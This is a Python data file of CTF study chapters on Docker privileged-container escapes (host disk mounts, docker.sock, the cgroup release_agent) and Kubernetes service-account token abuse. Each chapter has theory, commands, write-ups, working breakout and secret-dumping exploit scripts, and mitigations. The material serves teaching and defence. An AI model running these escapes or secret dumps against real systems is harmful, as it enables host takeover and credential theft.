"""
CTF Atlas — Cloud & Container Security Chapters
"""

chapters = {}

chapters["cloud-docker-escape"] = {
    "id": "cloud-docker-escape",
    "domain": "mobile-cloud",
    "category": "Cloud & Container Security",
    "title": "Container Isolation Primitives & Privileged Docker Escapes",
    "subtitle": "Linux Namespaces, Cgroups, Capabilities (CAP_SYS_ADMIN) & Host Breakouts via release_agent",
    "diagram": """+---------------------------------------------------------------+
|                       Host Operating System                   |
|  Linux Kernel (Shared across all containers on host)          |
|  Host Filesystem (/root, /etc, /dev/sda1)                     |
+-------------------------------+-------------------------------+
                                |
       +------------------------+------------------------+
       v                                                 v
+-------------------------------+         +-------------------------------+
|  Standard Isolated Container  |         |  Privileged Escaped Container |
| - Namespaces: PID, NET, MNT   |         | - Run with: `--privileged`    |
| - Drops dangerous capabilities|         | - Retains CAP_SYS_ADMIN       |
| - Cgroup limits enforced      |         | - Full access to /dev devices |
| - Host /proc protected        |         | - Mounts host /dev/sda1       |
+-------------------------------+         | - Exploits cgroup notify_on_  |
                                          |   release to execute host cmd |
                                          +-------------------------------+""",
    "theory": """Containers are NOT virtual machines. Virtual machines run on hypervisors (Type 1 or Type 2) with emulated virtual hardware and isolated guest operating system kernels. Containers, by contrast, are simply standard user-space host processes executing under kernel-level containment boundaries.

The Container Isolation Trinity:
1. Linux Namespaces (clone syscall flags): Partitions system resources so processes see only their own sandbox. (PID: process IDs; NET: virtual network devices and routing tables; MNT: filesystem mount points; UTS: hostname; IPC: shared memory; USER: UID/GID mappings).
2. Control Groups (Cgroups): Resource accounting and hardware constraints (CPU, RAM limits, block I/O, device access control).
3. Linux Capabilities (cap_get_proc): Slices monolithic root power into granular privileges (e.g. CAP_NET_BIND_SERVICE, CAP_SYS_ADMIN).

Privileged Container Breakout Mechanics:
When a container is started with the `--privileged` flag (or `CAP_SYS_ADMIN` capability and root UID), the kernel disables almost all containment security:
- Device nodes: The container inherits access to host block devices under `/dev/` (e.g. `/dev/sda1`, `/dev/nvme0n1p1`). The attacker simply runs `mount /dev/sda1 /mnt` and directly reads or modifies the host's `/etc/shadow` or `/root/.ssh/authorized_keys`.
- The Cgroup release_agent Vector: The kernel cgroups v1 subsystem supports automatic notification scripts when a cgroup becomes empty. By creating a temporary cgroup, enabling `notify_on_release = 1`, and setting `release_agent` to an attacker-controlled script inside the container's mapped filesystem, the host kernel executes the script with root privileges outside container boundaries.""",
    "commands": [
        {
            "cmd": "capsh --print",
            "why": "Audits active Linux capabilities within the current process to detect CAP_SYS_ADMIN or CAP_SYS_PTRACE.",
            "when": "First command upon obtaining access to an unknown container environment.",
            "internals": "Queries kernel task_struct->cred->cap_effective bitmask via capget syscall.",
            "pitfalls": "If capsh is missing in minimal containers, inspect `/proc/1/status` and decode `CapEff` hex string."
        },
        {
            "cmd": "fdisk -l",
            "why": "Checks if host physical storage partitions (/dev/sda, /dev/vda) are directly accessible inside container.",
            "when": "Verifying whether container was launched with --privileged flag.",
            "internals": "Scans /dev block device nodes registered in the kernel devtmpfs.",
            "pitfalls": "Standard containers have restricted device cgroups that block access to raw host disks."
        },
        {
            "cmd": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
            "why": "Escapes container if the Docker daemon Unix socket is mounted inside the container.",
            "when": "Checking `/var/run/docker.sock` mount.",
            "internals": "Instructs host Docker daemon to launch a container with the host root filesystem mounted.",
            "pitfalls": "Requires write access to the docker.sock file descriptor."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: Execute release_agent exploit one-liner -> write command to `/cmd` -> trigger cgroup release -> output written to host filesystem -> read host flag.",
        "gui_workflow": "Docker Desktop / Portainer GUI: Open Containers list -> Container Details -> Inspect 'Privileged: true' and Volumes mount list (`/var/run/docker.sock`).",
        "speed_tip": "If `/var/run/docker.sock` is mounted in the container: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host` escapes in 1 second."
    },
    "triage_workflow": [
        "1. Detect Containerization: Check `ls -la /.dockerenv` and `cat /proc/1/cgroup` (contains 'docker' or 'kubepods').",
        "2. Check Capabilities: Run `capsh --print` or inspect `CapEff` in `/proc/self/status`.",
        "3. Check Block Devices: Run `ls -la /dev/` to identify host disks (`/dev/sda1`, `/dev/vda1`).",
        "4. Check Docker Socket: Look for `/var/run/docker.sock`.",
        "5. Execute Breakout: If privileged, mount host disk directly or trigger cgroup `release_agent` execution.",
        "6. Recover Host Flag: Read `/mnt/host/root/flag.txt`."
    ],
    "writeup": {
        "ctf_event": "Google CTF / HackTheBox Proving Grounds",
        "challenge_name": "Container-Escape (Privileged Cgroup Breakout)",
        "scenario": "Solvers compromise a web server running inside a Docker container. Objective: Break out to host machine and retrieve /root/flag.txt.",
        "solve_steps": [
            "1. Confirm container: cat /proc/1/cgroup shows docker slice, /.dockerenv exists.",
            "2. Audit capabilities: capsh --print reveals CAP_SYS_ADMIN.",
            "3. Verify privileged mode: ls -la /dev/sda1 exists with rw permissions.",
            "4. Method 1 (Direct Mount): mkdir /host && mount /dev/sda1 /host",
            "5. Access host filesystem directly: cat /host/root/flag.txt",
            "6. Method 2 (Cgroup Release Agent): Configure notify_on_release script to execute `id > /output.txt` on host.",
            "7. Flag retrieved: CTF{C0NT41N3R_PR1V1L3G3D_BR34K0UT_2026}"
        ],
        "exploit_code": """#!/bin/sh
# Cgroup release_agent breakout exploit
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /root/flag.txt > '"$host_path"'/output' >> /cmd
chmod +x /cmd
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
cat /output""",
        "flag": "CTF{C0NT41N3R_PR1V1L3G3D_BR34K0UT_2026}",
        "mitigation": "Never run production containers with `--privileged`. Drop all capabilities using `--cap-drop=all`, enforce read-only root filesystems, and deploy gVisor or Kata Containers for strong virtualization-backed isolation."
    }
}

chapters["cloud-k8s-iam"] = {
    "id": "cloud-k8s-iam",
    "domain": "mobile-cloud",
    "category": "Cloud & Container Security",
    "title": "Kubernetes Pod Architecture, Service Accounts & Cloud IAM Pivots",
    "subtitle": "K8s API Tokens (/var/run/secrets), ClusterRoleBindings, AWS/GCP Metadata & RBAC Privilege Escalation",
    "diagram": """+-----------------------------------------------------------------+
|                  Kubernetes Pod Privilege Escalation            |
+-----------------------------------------------------------------+
Compromised K8s Pod (Namespace: default)
  |
  +-> 1. Harvest Service Account Token:
  |     /var/run/secrets/kubernetes.io/serviceaccount/token
  |     /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  |
  +-> 2. Query Kubernetes API Server (https://kubernetes.default):
  |     curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces
  |
  +-> 3. Check RBAC Permissions:
  |     kubectl auth can-i create pods --token=$TOKEN
  |
  +-> 4. Cluster Takeover (If create pods allowed):
        Launch root pod mounting host filesystem:
        spec: { containers: [{ volumeMounts: [{ mountPath: /host, name: root }] }] }
        -> Escape to control plane / node root!""",
    "theory": """Modern cloud-native applications execute inside container orchestration clusters managed by Kubernetes (K8s). When an attacker compromises an application container running inside a Kubernetes cluster, their immediate goal is to pivot from the local pod container to the Kubernetes cluster API, and subsequently to the underlying cloud infrastructure (AWS, GCP, Azure).

Kubernetes Service Account Architecture:
By default, Kubernetes mounts a ServiceAccount JSON Web Token (JWT) into every running pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The pod uses this token to authenticate to the internal cluster API server at `https://kubernetes.default.svc`.
- RBAC Privileges: If the service account has overly permissive RoleBindings or ClusterRoleBindings (such as permission to create pods, exec into existing pods, or read secrets), the attacker can query `/api/v1/namespaces/default/secrets` to retrieve database credentials and TLS keys.
- Host Node Takeover: If the ServiceAccount can create pods, the attacker creates a pod with `hostPID: true`, `hostNetwork: true`, and a hostPath volume mounting `/` to `/host`. Chrooting into `/host` provides instantaneous root access on the underlying worker node.

Cloud IAM Pivots from Kubernetes:
Pods running on managed cloud Kubernetes clusters (AWS EKS with IRSA, GCP GKE with Workload Identity) often have cloud IAM roles bound to their service accounts. Solvers query the cloud metadata service from within the pod to extract temporary cloud provider IAM credentials, pivoting from the container into the organization's cloud storage buckets (S3, GCS) and management consoles.""",
    "commands": [
        {
            "cmd": "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default/api/v1/namespaces/default/secrets",
            "why": "Dumps all Kubernetes secrets (API keys, passwords, certificates) stored in the current namespace.",
            "when": "First command upon compromising a Kubernetes container.",
            "internals": "Authenticates to kube-apiserver using the mounted JWT bearer token.",
            "pitfalls": "Fails if RBAC does not grant get/list secrets permissions."
        },
        {
            "cmd": "kubectl auth can-i --list",
            "why": "Queries the API server to display all authorized operations for the current service account.",
            "when": "Assessing RBAC privilege escalation vectors.",
            "internals": "Issues a SelfSubjectRulesReview API call.",
            "pitfalls": "Requires kubectl installed; if missing, query API endpoints manually with curl."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: `export TOKEN=$(cat /var/run/secrets/.../token)` -> `curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api`.",
        "gui_workflow": "Kubernetes Dashboard / Lens: Visual cluster management displaying pods, deployments, configmaps, and secrets.",
        "speed_tip": "If `curl` is missing inside minimal distroless containers, use Python: `import urllib.request; urllib.request.urlopen(...)`."
    },
    "triage_workflow": [
        "1. Detect Kubernetes Environment: Check `env | grep KUBERNETES` or `ls /var/run/secrets/kubernetes.io`.",
        "2. Extract ServiceAccount JWT: Read `/var/run/secrets/kubernetes.io/serviceaccount/token`.",
        "3. Decode Token: Inspect JWT claims to identify namespace and service account name.",
        "4. Enumerate Cluster API: Query namespaces, pods, and secrets.",
        "5. Test Cloud Metadata: Query `http://169.254.169.254` for cloud provider IAM roles.",
        "6. Create Privileged Pod: If permitted, launch hostPath pod to capture node flag."
    ],
    "writeup": {
        "ctf_event": "Google CTF / DEF CON Cloud Village",
        "challenge_name": "Pod-Break (Kubernetes RBAC Secret Leak)",
        "scenario": "Solvers gain RCE on a web pod in a Kubernetes cluster. The objective is to retrieve the cluster master flag stored in a secret.",
        "solve_steps": [
            "1. Verify Kubernetes pod context: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`.",
            "2. Set token environment variable.",
            "3. Query API server: `curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api/v1/namespaces/kube-system/secrets`.",
            "4. API returns 403 Forbidden for kube-system, but allows `default` namespace.",
            "5. Query secrets in default namespace: `https://kubernetes.default/api/v1/namespaces/default/secrets`.",
            "6. Discovers secret: `flag-vault` containing base64 field: `flag: Q1RGe0szU19TQVNfVE9LRU5fUkJBQ19QV059`.",
            "7. Base64 decode: `CTF{K3S_SAS_TOKEN_RBAC_PWN}`.",
            "8. Flag: CTF{K3S_SAS_TOKEN_RBAC_PWN}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import urllib.request, ssl, base64, json

token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
ctx = ssl._create_unverified_context()

req = urllib.request.Request(
    "https://kubernetes.default/api/v1/namespaces/default/secrets",
    headers={"Authorization": f"Bearer {token}"}
)

with urllib.request.urlopen(req, context=ctx) as r:
    data = json.loads(r.read())
    for item in data.get("items", []):
        if "flag" in item.get("data", {}):
            flag_b64 = item["data"]["flag"]
            print("[+] Flag:", base64.b64decode(flag_b64).decode())""",
        "flag": "CTF{K3S_SAS_TOKEN_RBAC_PWN}",
        "mitigation": "Disable automatic ServiceAccount token mounting (`automountServiceAccountToken: false`) on pods that do not require cluster API communication, and enforce least-privilege RBAC policies."
    }
}
